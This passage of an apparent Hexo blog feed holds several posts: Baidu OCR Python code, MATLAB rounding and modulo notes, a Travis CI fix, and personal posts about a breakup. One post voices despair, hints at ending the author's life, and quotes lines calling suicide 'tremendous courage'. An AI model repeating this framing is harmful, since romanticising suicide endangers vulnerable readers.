      <content type="html"><![CDATA[<h1 id="Preview"><a href="#Preview" class="headerlink" title="Preview"></a>Preview</h1><p>见鬼的百度 OCR API，免费的中文识别率相对好一点的我只知道这个。希望大家多多推荐好用的。</p><p>这垃圾玩意浪费了我半个下午的时间，只因为官网的 Restful API 文档最关键的地方出错了！</p><h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><p>需要的自取，实测可用。这是通用高精度 OCR 基础版 API 的处理，最终结果直接拼接字符串后保存。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token comment" spellcheck="true"># -*- encoding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">import</span> json<span class="token keyword">def</span> <span class="token function">gettoken</span><span class="token punctuation">(</span>apikey<span class="token punctuation">,</span>secretkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    acstk <span class="token operator">=</span> <span class="token string">'https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&amp;client_id='</span> <span class="token operator">+</span> apikey <span class="token operator">+</span> <span class="token string">'&amp;client_secret='</span> <span class="token operator">+</span> secretkey    getacs <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>acstk<span class="token punctuation">,</span>headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span><span class="token string">'application/json; charset=UTF-8'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    whocare <span class="token operator">=</span> getacs<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> whocare<span class="token punctuation">[</span><span class="token string">'access_token'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">ocrnow</span><span class="token punctuation">(</span>tokens<span class="token punctuation">,</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    baseurl <span class="token operator">=</span> <span class="token string">'https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic'</span>    query_url <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token string">'?access_token='</span> <span class="token operator">+</span> tokens    <span class="token keyword">with</span> open<span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file<span class="token punctuation">:</span>        data2 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    datatp <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'image'</span><span class="token punctuation">:</span>data2<span class="token punctuation">}</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>query_url<span class="token punctuation">,</span>headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span><span class="token string">'multipart/form-data'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>data<span class="token operator">=</span>datatp<span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'result.json'</span><span class="token punctuation">,</span><span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fl1<span class="token punctuation">:</span>        fl1<span class="token punctuation">.</span>write<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">procresu</span><span class="token punctuation">(</span>resultjson<span class="token punctuation">)</span><span class="token punctuation">:</span>    fl1 <span class="token operator">=</span> open<span class="token punctuation">(</span>resultjson<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    dat1 <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>fl1<span class="token punctuation">)</span>    final <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dat1<span class="token punctuation">[</span><span class="token string">'words_result'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        final <span class="token operator">=</span> final <span class="token operator">+</span> i<span class="token punctuation">[</span><span class="token string">'words'</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'result.txt'</span><span class="token punctuation">,</span><span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp23<span class="token punctuation">:</span>        fp23<span class="token punctuation">.</span>write<span class="token punctuation">(</span>final<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Super-Boom"><a href="#Super-Boom" class="headerlink" title="Super Boom"></a>Super Boom</h1><ol><li>最终上传图片时的 header 应为 <code>headers={&#39;Content-Type&#39;:&#39;multipart/form-data&#39;}</code></li><li>图片只需要 <code>base64.b64encode().decode()</code> ， 不需要 <code>urllib.parse.quote_from_bytes()</code></li></ol>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Misunderstand? No, I&#39;m a coward.</title>
      <link href="/2018/I-hate-myself-a-stranger/"/>
      <url>/2018/I-hate-myself-a-stranger/</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=283846&auto=1&height=66"></iframe><blockquote><p>人们都希望被别人需要 却往往事与愿违<br>Speak not because it is safe, but because it is right.<br>那已不是你那年的回忆，却依旧是我昨日的记忆。<br>希望 你的未来 不要有人伤害你，否则，我一定不惜代价守护你到底。这一条永远不变。</p></blockquote><h1 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h1><p>本文可能引起您的不适，请做好心理准备。对在这篇文章中提及的人名，均不作处理，保留真名或昵称。<br>本文禁止任何形式的转发、转载、演绎。不适用于本博客的 CC 授权。<br>本文不带任何目的，仅做个人反思，不做挽留、不做道歉、不做任何依据。</p><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>我是一个真正的 coward 和 bastard.</p><p>最近经历了一段亲密关系的破裂，也发现这个过程中暴露的许多问题。我有种预感，心里的这个障碍会阻碍我一生中所有亲密关系的建立。<br>我的另一种预感是，我 和 你 迟早还会走到一起，不过，生活的事情，谁知道又是怎样呢。</p><p>促使我写这篇文章的根本原因我在上面已经说过，直接原因是一位曾经在 Bot 上帮助过我的大佬： Bennythink 土豆君的这篇博文在这样一个时间点的发布。</p><p>我没有 Benny 那样的勇气直面自己内心最灰暗的那一面，但迟早都要面对。之前的博文，以英文写作的部分，基本都是没办法直面自己的这一部分。但是，现在再不面对，或许，真的，没有未来了。</p><p>男人暴露自己的脆弱的一面并不就变得一无是处，男人有和女人一样的表达内心脆弱的权利。</p><p>相关博文前情提要：</p><ul><li>建议阅读: 生活啊，究竟是为了什么呢 <a href="https://www.bennythink.com/purpose-of-life.html" target="_blank" rel="noopener">https://www.bennythink.com/purpose-of-life.html</a> </li></ul><blockquote><p>插播：上面这篇文章的评论区： 对于刚入社会的年轻人来说，总会有种恐慌，觉得为什么自己没有钱，没有存款。这是现如今社会的一种现状。记住你有你的青春，把青春奉献到什么地方就会从什么地方收获。把自己有限的资源共享在自己的事业中，自己的成长中。坚持到底。你会让你的孩子不会输在起跑线。 对于爱情来说，或许我经历的恰好是一段完美的爱情，从校园到社会，到如今的结婚生子。生活的很幸福，相互理解，相互扶持。最总要的是共同进步，有相同的价值观…或许你之前的没有结果，但这绝不是一个人的问题，是互相的问题。所以这时候就体现出来共同进步的作用。 对于离去这一个话题，我只表达自己的想法。 这就是对于生命的不尊重，对所有人的不负责任。 最后建议，在生活迷茫时，需要的是一群良师益友，能给你正能量。</p></blockquote><ul><li>建议阅读：我与明明 <a href="https://www.bennythink.com/me-and-mingming.html" target="_blank" rel="noopener">https://www.bennythink.com/me-and-mingming.html</a></li><li>看不到希望的未来 <a href="https://www.bennythink.com/hopeless-future.html" target="_blank" rel="noopener">https://www.bennythink.com/hopeless-future.html</a></li><li>一切归于平静 - 开学前的最后一篇博文 <a href="https://www.kmahyyg.xyz/2018/Zoe-I-Departed/">https://www.kmahyyg.xyz/2018/Zoe-I-Departed/</a></li><li>暑假结束 - 我爱的人和爱我的人 <a href="https://www.kmahyyg.xyz/2018/Summer-Holiday-End/">https://www.kmahyyg.xyz/2018/Summer-Holiday-End/</a></li><li>2018 年中 工作总结 <a href="https://www.kmahyyg.xyz/2018/2018-Mid-Work-Summary/">https://www.kmahyyg.xyz/2018/2018-Mid-Work-Summary/</a></li></ul><h1 id="Coward-Bastard-Yes-it’s-myself"><a href="#Coward-Bastard-Yes-it’s-myself" class="headerlink" title="Coward, Bastard, Yes, it’s myself!"></a>Coward, Bastard, Yes, it’s myself!</h1><p>我真是一个彻头彻尾的混蛋，我不敢去面对我的内心。我也这样，伤害了一个把我的心耗尽 ta 的心血捧在手里的人。</p><p>小时候家庭的不和，让我至今心有余悸。我害怕失去，我害怕离别，我害怕那种叫做 陌生 的感觉。那些经历，让我感受到的只有伤害与背叛。这些行为，至今依然在我的面前一遍又一遍、一天又一天的重复上演，所以我从小也就不信任任何人。我害怕，我担心，我不敢哭泣，不敢透露。总想做自己能做的所有，把自己都给那个心里的人，只希望 ta 不要离开，显然，这样只会把 ta 越推越远。那些心理上的伤害，所谓的出发点正确但方式错误，都他妈的给我滚去一边吧！我勉强理解，但绝不原谅！心都是玻璃做的，需要小心翼翼，这颗心，虽然外表坚硬，但只要受到一点点打击，都会从内部产生一段裂痕。当这些裂痕慢慢扩大到无法压抑的时候，也就是一个人崩溃的时候。我已经处在崩溃的边缘。</p><p>我恨自己，恨自己每天都在用所谓的 poker face 伪装，为自己内心的软弱寻找借口。用表面的忙碌，希望遮掩自己的碌碌无为和内心的空虚。内心脆弱，假装表面强大，又有什么用，只会把自己伤的更深。当你在英语课上提出那个问题 “Why you always looks so sad and with the same emotion?” 的时候，我愣了一愣，内心早已决堤。但，毕竟是公共场合，也只能假装敷衍而过。说白了，也就是内心害怕受到一点点伤害，不想让别人知道我的内心如此的不堪一击。我的不信任，我的伪装，已经摧毁了一段又一段可能建立的 <strong>朋友关系（亲密关系是不可能的）</strong> 。直到碰到了你，我知道，我或许应该有希望重新点燃那把内心的火炬。</p><p>我恨自己，恨自己一直想要乞求那么一点点本来就不，也不可能属于我的那一点点关爱。内心缺乏的，也就是渴望的，太过渴望，只有失望。</p><p>我恨自己，恨自己出现在了一个不恰当的地点，不恰当的时间，遇到了一个恰当的人。却把她弄丢，最终连朋友都做不了，只能在宿舍的枕头上默默哭泣。写这篇博文的时候，我也只有手和脑袋在正常工作了。对不起，我对不起你，对不起你的付出，对不起你的一切。也对不起我自己。我只想养一只可爱的小猫，一只可以用她比人类寿命还短许多的一生来陪伴人类的动物，一个我的永久的伴侣和我的家庭成员。曾经看过一个什么东西，是这样写的：“对于你的宠物而言，或许她们只是你的一生的可有可无的一部分，但是，她们却只有你作为她们的一生。”抱歉，我选择用我的一生和我所有的心都奉献给这个把她的一切都给我的朋友。谢谢你，猫咪。如果我真的遇到那只猫咪，当她走后，我还没有遇到那一个正确的人，我估计也就失望到底，送走了我妈之后，也就了此残生。</p><blockquote><p>A true suicide is a paced, disciplined certainty.<br>People pontificate “Suicide is a coward’s act”.<br>Couldn’t be further from the truth.<br>Suicide takes tremendous courage.</p></blockquote><hr><h2 id="收拾下心情，擦擦眼泪，我回来了。"><a href="#收拾下心情，擦擦眼泪，我回来了。" class="headerlink" title="收拾下心情，擦擦眼泪，我回来了。"></a>收拾下心情，擦擦眼泪，我回来了。</h2><p><img src="https://yygc.zzjnyyz.cn/asset_files/hateself1.jpg" alt="cat"></p><p>我恨自己，恨自己不敢面对我内心那个真实而又脆弱的我，不敢把它暴露出来，接受阳光的修复和洗礼。</p><p>我恨自己，恨自己没有办法真的信任一个人。遇到你，我第一次和你说离别的时候。看到你说在图书馆哭了一下午，也终于知道我在你心里的位置的时候，我终于明白了什么叫做有个人在惦记着你，终于明白了什么叫作肝肠寸断。我也决定放下戒备，开始完全无条件的信任一个人。从坦白我的过去开始，终于，在那个夜晚，我还是说出了我一直的心结中的一部分，我的家庭。慢慢信任你的一切。然而，那压不住的不信任的潜在的一天还是来了，我就是想知道你的最终想法，我偶尔撒娇，偶尔卖萌，也只是得到了礼貌性的回复。我和一部分不知道我的过去的朋友说了一些我们之前的一些感情，他们无不被这份感情的纯真感动，但也提醒我潜在的风险，时至今日，这一潜在风险还是成真了。</p><p>说实话，我最终还是爆炸了。我想，我用真心付出了那么多，还是感觉不到任何回应，还是放弃吧。选择了一个如此残暴的方式放弃……非常抱歉……我不想被小心翼翼的捧着，我只想你也能和我撒撒娇、发发脾气，平平淡淡，也就 okay，偶尔也溺爱一下我，我们能在需要的时候互相关心、互相陪伴、共同走过，也就足够了。可惜，貌似还是做不到。我也只能忍痛放下。</p><p>我做的也太过分了一点，明明自己就做得如此糟糕，有什么资格要求别人给予呢？</p><h1 id="Mistrust-is-the-most-harmful-one"><a href="#Mistrust-is-the-most-harmful-one" class="headerlink" title="Mistrust is the most harmful one"></a>Mistrust is the most harmful one</h1><p>谢谢你，此刻，我也只有这几个字，还有，那句欠你一生的 “对不起”。终究，两个脆弱的人是总有那么一些不可能的。毕竟 脆弱的心 容不得 半点 更多 的 伤害。</p><h1 id="FRIENDSHIP-FOREVER"><a href="#FRIENDSHIP-FOREVER" class="headerlink" title="FRIENDSHIP FOREVER"></a>FRIENDSHIP FOREVER</h1><p>让这段我耗尽我此生至今 19 年中我最多的心血的感情，随着那一把心里山火，烧光吧。让 ta 随风而去吧，我知道：我永远无法原谅以这样方式结束这段经历的自己。</p><p>谢谢你，<br>真想和你重新相遇，</p><p>过去的，唉……终究不会再来了，碎掉的心也已经不可能再找回来了。<br>总归是把这些东西写下来了，也算给了自己半个交代。</p><p>我知道在我们身边有几个人是会看这个博客的，也就这样吧。<br>坦白面对自己的最阴暗的一面，<br>也是人生必须的功课。</p><p>隐隐腹痛，难以入睡<br>2018.8.28 夜</p><p>著于 8.29 凌晨，心情 极差<br>真想揪着自己的耳朵对自己大吼：醒醒！</p><p>暂且先这样吧，断断续续写了一些，哪天想起来这段经历有什么感悟，再来 update 吧。<br>Patrick Y.</p><p>对了，答应我，不管什么时候，好好对待自己。算了，我没有立场这样请求……</p><p>UPDATE 1:  惟将终夜长开眼，报答平生未展眉。</p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>fix() 与 floor() 函数的区别</title>
      <link href="/2018/Matlab-fixVSfloor/"/>
      <url>/2018/Matlab-fixVSfloor/</url>
      <content type="html"><![CDATA[<blockquote><p>转载自: <a href="http://blog.sina.com.cn/s/blog_574d08530100p1bp.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_574d08530100p1bp.html</a><br>国内各大博客关的关，停的停，干脆转过来存档<br>版权归原作者所有</p></blockquote><p>fix(x), floor(x) 和 ceil(x) 函数都是对 x 取整，只不过取整方向不同而已。</p><p>这里的方向是以x轴作为横坐标来看的，向右就是朝着正轴方向，向左就是朝着负轴方向。</p><p>fix(x)：向 0 取整（也可以理解为向中间取整）</p><p>floor(x)：向左取整</p><p>ceil(x)：向右取整</p><p>举例：</p><p>4个数：a=3.3、b=3.7、c=-3.3、d=-3.7</p><p>fix(a)=3</p><p>floor(a)=3</p><p>ceil(a)=4</p><hr><p>fix(b)=3</p><p>floor(b)=3</p><p>ceil(b)=4</p><hr><p>fix(c)=-3</p><p>floor(c)=-4</p><p>ceil(c)=-3</p><hr><p>fix(d)=-3</p><p>floor(d)=-4</p><p>ceil(d)=-3</p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>rem() 与 mod() 函数的区别</title>
      <link href="/2018/Matlab-remVSmod/"/>
      <url>/2018/Matlab-remVSmod/</url>
      <content type="html"><![CDATA[<blockquote><p>转载自: <a href="http://blog.sina.com.cn/s/blog_633750d90100gs8p.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_633750d90100gs8p.html</a><br>国内各大博客关的关，停的停，干脆转过来存档<br>版权归原作者所有</p></blockquote><p>取模（mod）与取余（rem）的区别 —— Matlab 学习笔记【09-11-15】</p><p>本帖来自:数学中国 作者: 木长春 日期: 2009-11-15 19:51</p><p>昨天在学习 Matlab 的数学函数时，教程中提到取模（mod）与取余（rem）是不同的，今天在网上具体查了一下：</p><p>通常取模运算也叫取余运算，它们返回结果都是余数. rem 和 mod 唯一的区别在于:</p><p>x 和 y 的正负号一样的时候，两个函数结果是等同的；当 x 和 y 的符号不同时，rem 函数结果的符号和x的一样，而 mod 和 y 一样。</p><p>这是由于这两个函数的生成机制不同，rem 函数采用 fix 函数，而 mod 函数采用了 floor 函数（这两个函数是用来取整的，fix 函数向 0 方向舍入，floor 函数向无穷小方向舍入）。<br>rem（x，y） 命令返回的是 x-n.<em>y ，如果 y 不等于0，其中的n = fix(x./y)，而 mod(x,y) 返回的是 x-n.</em>y，当 y 不等于 0 时，n = floor(x./y)</p><p>两个异号整数取模取值规律            （当是小数时也是这个运算规律，这一点好像与C语言的不太一样）</p><p>先将两个整数看作是正数，再作除法运算</p><p>①能整除时，其值为0</p><p>②不能整除时，其值=除数×(整商+1)-被除数</p><p>例：mod(36,-10)=-4</p><p>即：36除以10的整数商为3，加1后为4；其与除数之积为40；再与被数之差为（40-36=4）；取除数的符号。所以值为-4。</p><p>例：mod(9,1.2)=0.6</p><p>例：</p><blockquote><blockquote><p>mod(5,2)<br>ans =1                   %“除数”是正，“余数”就是正</p></blockquote></blockquote><blockquote><blockquote><p>mod(-5,2)<br>ans =1</p></blockquote></blockquote><blockquote><blockquote><p>mod(5,-2)<br>ans =-1                  %“除数”是负，“余数‘就是负</p></blockquote></blockquote><blockquote><blockquote><p>mod(-5,-2)<br>ans =-1                  %用rem时，不管“除数”是正是负，“余数”的符号与“被除数”的符号相同</p></blockquote></blockquote><blockquote><blockquote><p>rem(5,2)<br>ans =1                   %“被除数”是正，“余数”就是正</p></blockquote></blockquote><blockquote><blockquote><p>rem(5,-2)<br>ans =1</p></blockquote></blockquote><blockquote><blockquote><p>rem(-5,2)<br>ans =-1                 %“被除数”是负，“余数”就是负</p></blockquote></blockquote><blockquote><blockquote><p>rem(-5,-2)<br>ans =-1</p></blockquote></blockquote>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一切归于平静 - 开学前的最后一篇博文</title>
      <link href="/2018/Zoe-I-Departed/"/>
      <url>/2018/Zoe-I-Departed/</url>
      <content type="html"><![CDATA[<p>限于版权保护，只能这样了……<br><a href="https://music.163.com/#/song?id=1304302909" target="_blank" rel="noopener">背景音乐 花粥 / 孟凡明 - 摸摸它</a></p><h1 id="断开连接日"><a href="#断开连接日" class="headerlink" title="断开连接日"></a>断开连接日</h1><p>今天尝试了一次完全断开与世界的连接，由于昨天知道有两个快递要到，还是没有关手机。不过真的是停用了所有社交应用，今天专注于 Code 和 写作，只留下电子邮件的感觉非常好。</p><p>我觉得我们已经过度信息化，信息超载早已成为定局，我们能做的就是尽量适应。同时尽可能地减少注意力的流失。这一点来说 Google 走在了几大厂商的前面，发布了 Digital Wellbeing，虽然目前只能 Pixel 设备使用，但仍然很有帮助，帮助我减少了很多不必要的查看手机的时间。</p><p>完全使用现金支付，在节假日尽可能停用手机是完全可以做到，内心自然也会平静的。这样的确让人感觉非常专注，非常惬意。在魁阁的露台上，品茶、享受着和风，专心地做着自己喜欢的事情，有什么不好的呢？</p><p>所以，我宣布：接下来的这个学期，每周六下课之后就进入 24 h 的断开连接状态！有急事需要找我的朋友，请联系我的私人号码或者发邮件给我，公用号码一样开机，只是会被直接 Ignore 罢了。</p><h1 id="身体"><a href="#身体" class="headerlink" title="身体"></a>身体</h1><p>发现自己还是总算可以算得上能吃辣的了，略开心，不过嘛……吃太多对身体不好，熬夜也一样 XD</p><p>晚上千万不能喝一整瓶的王老吉或者可乐，半夜三更拉肚子，睡不着觉，难受……</p><p>忽然发现，喵喵真的好棒，好想马上就养一只猫，画个大大大的爱心～</p><h1 id="那些看起来美好的事物"><a href="#那些看起来美好的事物" class="headerlink" title="那些看起来美好的事物"></a>那些看起来美好的事物</h1><p>本来懒得措辞了，希望就简短的回复一下，不过估计直接用中文回复的话，会简单地过分，甚至会有 offensive 的味道，想了想，还是用英文吧。</p><p>Dear ZoeCat,</p><p>Hope this letter finds you well. Thanks for your honesty. I’m in such a happy status that you’ve already learnt to be determined. First of all, Although things went as this, I still need the seat at the very first row in each class, hope you will not steal it from me.</p><p>In the rest of the letter, it will be divided into three parts.</p><p>Part one: Q&amp;A time</p><ol><li>Feel unhappy today?</li></ol><blockquote><p>Of course not, I just don’t want anybody to interupt my disconnected day.</p></blockquote><ol start="2"><li>What have you done to make me bored?</li></ol><blockquote><p>Nothing.</p></blockquote><ol start="3"><li>Treat your cold and guessing……?</li></ol><blockquote><p>That’s the most common way I treat each one in “unrelated people” list.</p></blockquote><ol start="4"><li>What’s the best relationship between to similar ones?</li></ol><blockquote><p>Follow your hearts, Try your best and then listen to the fate.</p></blockquote><p>Part two: Thoughts</p><p>I’ve already predicted this result at the very beginning of this summer holiday. But I still want to try to do some emergency saving for this relationship,<br>hope it lasts much longer or keep forever. Remember, I’ve told you some day that I have some hypothesis to prove. That’s it. Some friends have tried to persuade me not to pick you up at the airport. Finally, I still decided to go for it, to do a final confirmation. Saddest, I proved this hypothesis is definitely true. You already answered me several times on your face, so yesterday I told you, “The summer holiday ended, (maybe) see you next semester.” Until today, at the time I heard from you, I released, and knew my future plans still need a cleanup as predicted.</p><p>Part three: My begging</p><p>First of all, I have to inform you that you’ve already been tagged “blacklist” in my soul mate list after I picked you. You are a good friend, but not a good soul mate. I confirmed you are still a good friend. I’m really sad, but life still goes on. So I’m still happy, Cuz unhappy will only cost me all things without any return. Secondly, I hope there will be no more other reply. Thanks for your understanding.</p><p>Hope you have a better day.</p><p>Cordially,<br>Patrick Cat</p><p>Written at Sun Aug 26 20:05:16 CST 2018</p><h2 id="The-reason-I-deleted-her"><a href="#The-reason-I-deleted-her" class="headerlink" title="The reason I deleted her"></a>The reason I deleted her</h2><p>I didn’t want to do that at the very first time. I could understand that you’re protecting yourself. But you know that I won’t do any harm to you. You still chose to cheat me. I chose to exchange with my true heart, but you don’t even understand it a bit. That’s what I can’t stand.</p><p>UPDATE： I just want a little bit response from heart to heart, but so hard to feel. See you. Thanks for your company and honesty.</p><h1 id="License"><a href="#License" class="headerlink" title="License"></a>License</h1><p>YOU ARE NOT PERMITTED TO FORWARD IT ANYWHERE OR POST IT ANYWHERE ELSE (INCLUDING LINK TO THIS POST), NO DERIVS.</p><p>Special License. </p><p>All rights reserved. </p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hexo 与 Travis CI 的八字不合</title>
      <link href="/2018/Hexo-Travis/"/>
      <url>/2018/Hexo-Travis/</url>
      <content type="html"><![CDATA[<h1 id="前因"><a href="#前因" class="headerlink" title="前因"></a>前因</h1><p>请查看 <a href="/2018/Sucked-Travis-CI/">见鬼的 Travis CI</a></p><h1 id="第一次查错"><a href="#第一次查错" class="headerlink" title="第一次查错"></a>第一次查错</h1><p>最近的 Travis CI Status Page 显示所有 <code>sudo:required</code> 的 build 均统一出现异常，没有太过在意。<br>联系 Travis CI 客服之后客服让我把 <code>sudo:required</code> 去掉，以便重新把我的 build 引流到 container-based 的另一个基础设施上。<br>后面短时间内的几个 build 均正常，可过了一段时间之后又回到了前面提到的状况当中。</p><h1 id="第二次查错"><a href="#第二次查错" class="headerlink" title="第二次查错"></a>第二次查错</h1><p>客服的反馈是可能是环境变量和 npm 包的安装问题，建议我自查之后尝试把安装 <code>hexo-cli</code> 的参数从 <code>-g --save</code> 变成 <code>--save</code> 或 空。<br>查询 Hexo 官网 之后得知不能去掉 <code>-g</code>，尝试去掉或按照客服建议均无法成功，提示 <code>bash: hexo not found.</code><br>继续邮件反馈给客服，3 天后收到了回信。</p><h1 id="第三次查错"><a href="#第三次查错" class="headerlink" title="第三次查错"></a>第三次查错</h1><p>这一次回复的客服从 Customer Service Specialist 变成了 Travis Builder。她尝试 Fork 了我对应的 Repo 并进行了一系列测试，最终反馈了如下的结果：</p><ul><li>The problem does only happen when the node modules are cached.</li><li>When the cached modules are used, the errors seem to follow an interesting pattern: 1 out of 2 builds fail, consecutively. I think this explains the behavior you’re seeing where restarting the build makes it work. (This: build history list)</li><li>This pattern made me think that the error might be caused by the combination of how cached contents are downloaded in the VM (this is, when the cache is downloaded and set up, I assume the order in which files are included might vary) AND, maybe, the order in which NPM is detecting these cached modules.</li><li>Something I noticed is that, in these builds, NPM install seems to be returning a different output in each of them, where the order of these hexo packages varies.</li><li>I found that, when the packages are installed in the same order, the problem does not happen:</li></ul><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">install</span><span class="token punctuation">:</span><span class="token punctuation">-</span> npm install hexo<span class="token punctuation">-</span>cli <span class="token punctuation">-</span>g <span class="token punctuation">-</span><span class="token punctuation">-</span>save<span class="token punctuation">-</span> npm install hexo<span class="token punctuation">-</span>helper<span class="token punctuation">-</span>qrcode<span class="token punctuation">-</span> npm install hexo<span class="token punctuation">-</span>generator<span class="token punctuation">-</span>feed<span class="token punctuation">-</span> npm install hexo<span class="token punctuation">-</span>deployer<span class="token punctuation">-</span>git<span class="token punctuation">-</span> npm install hexo<span class="token punctuation">-</span>prism<span class="token punctuation">-</span>plugin<span class="token punctuation">-</span> npm install hexo<span class="token punctuation">-</span>generator<span class="token punctuation">-</span>search<span class="token punctuation">-</span> npm install hexo<span class="token punctuation">-</span> npm install hexo<span class="token punctuation">-</span>generator<span class="token punctuation">-</span>sitemap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>客服也注意到有人遇到了同样的问题，在 Hexo 的 Issues 里报了 Bug.</p><blockquote><p>As a bit more information, the order in which NPM installs packages, in general, is not deterministic since this shouldn’t be relevant. However, it seems this is causing some differences here and I wonder if this might be related to a Hexo bug, as it happened here: <a href="https://github.com/hexojs/hexo/issues/2076" target="_blank" rel="noopener">https://github.com/hexojs/hexo/issues/2076</a></p></blockquote><p>并建议我按照上面的顺序重写我的 <code>.travis.yml</code> 然后再行尝试。</p><p>最后客服提到了关键的一点 <code>package.json</code> 和 <code>package-lock.json</code>:</p><blockquote><p>Something I also noticed is that your package.json doesn’t seem to be up-to-date with these installed packages, see the updates after the npm installs.</p><p>After deleting the package-lock.json file during the build, I could obtain several working builds in a row and the intermittent failures didn’t appear: See builds. <strong>This seems to reinforce the hypothesis that the way NPM is treating these dependencies, non-deterministically, might be causing these errors.</strong></p></blockquote><p>然而 <code>bash: hexo not found.</code> 的问题解决了， <code>hexo g</code> 生成静态内容的问题又出现了。<br>我先按照建议把 <code>package.json</code> 和 <code>package-lock.json</code> 删除后提交触发 build，然而还是 useless.<br>这一次我把和客服沟通的邮件 po 到了我博客所使用的主题的支持群中，请求开发者帮助。</p><h1 id="最终查错"><a href="#最终查错" class="headerlink" title="最终查错"></a>最终查错</h1><p>在这里，先感谢 @ysc3839 的帮助。</p><p>他建议我先在一个全新的干净环境下本地安装一次依赖之后将 <code>package.json</code> 和 <code>package-lock.json</code> 添加到 Repo 中。</p><p>最后我新建了一个 Cloud9 WebIDE Workspace，新建文件夹并从零开始安装了所有依赖，并使用空内容博客尝试进行了一次 <code>hexo g</code> 操作。测试成功后将 <code>package.json</code> 和 <code>package-lock.json</code> 添加到 原有的 Repo 中覆盖。这一次问题解决了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我做了这几件事来解决这个问题：</p><ul><li>Start a new and clean environment at local</li></ul><p>这一步使用了这些指令：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">npm</span> <span class="token function">install</span> hexo-cli -g --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>Create a new folder and input <code>hexo init</code></li><li>Install all the npm dependencies I need (installation commands all<br>coms from <code>.travis.yml</code> )</li></ul><p>这一步使用了这些指令：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">npm</span> <span class="token function">install</span> hexo hexo-deployer-git hexo-prism-plugin hexo-helper-qrcode hexo-generator-search hexo-generator-sitemap hexo-generator-feed --save <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>Copy the <code>package.json</code> and <code>package-lock.json</code> to the existing repo<br>and replace the old ones</li><li>Change <code>install</code> stage commands.</li></ul><p>最终的 <code>.travis.yml</code> 中的 install stage 是这样的：</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">install</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> npm install hexo<span class="token punctuation">-</span>cli <span class="token punctuation">-</span>g <span class="token punctuation">-</span><span class="token punctuation">-</span>save  <span class="token punctuation">-</span> npm install<span aria-hidden="true" 